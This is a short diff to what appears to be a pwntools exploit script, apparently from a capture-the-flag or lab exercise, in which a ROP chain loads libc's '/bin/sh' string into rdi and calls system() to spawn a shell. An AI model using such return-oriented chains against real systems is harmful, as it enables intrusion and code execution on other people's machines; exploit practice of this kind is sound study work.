@@ -135,7 +135,6 @@ bin_sh = libc_base + libc.search('/bin/sh').next()
 
 rop2 = flat(p64(buf + 32),
             p64(0xdeadbeef),
-            # p64(ret),
             p64(pop_rdi),
             p64(bin_sh),
             p64(libc_system),
